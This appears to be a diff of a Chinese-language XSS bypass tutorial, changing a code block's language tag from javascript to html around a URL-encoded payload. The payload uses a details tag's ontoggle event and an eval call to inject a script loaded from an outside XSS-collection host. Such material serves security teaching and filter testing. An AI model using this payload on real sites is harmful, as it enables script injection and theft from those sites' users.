@@ -126,7 +126,7 @@
  ![16](https://ws1.sinaimg.cn/large/005DAKuvgy1g1uh5hp1a8j30uj0b1jsy.jpg)
   
   url编码
-  ```javascript
+  ```html
   <details open ontoggle=eval(%61%70%70%65%6e%64%43%68%69%6c%64%28%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%29%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%78%73%73%2e%74%66%2f%65%65%57%27) >
   ```
   ![17](https://ws1.sinaimg.cn/large/005DAKuvgy1g1uhaxb0t2j30uj09uwg1.jpg)
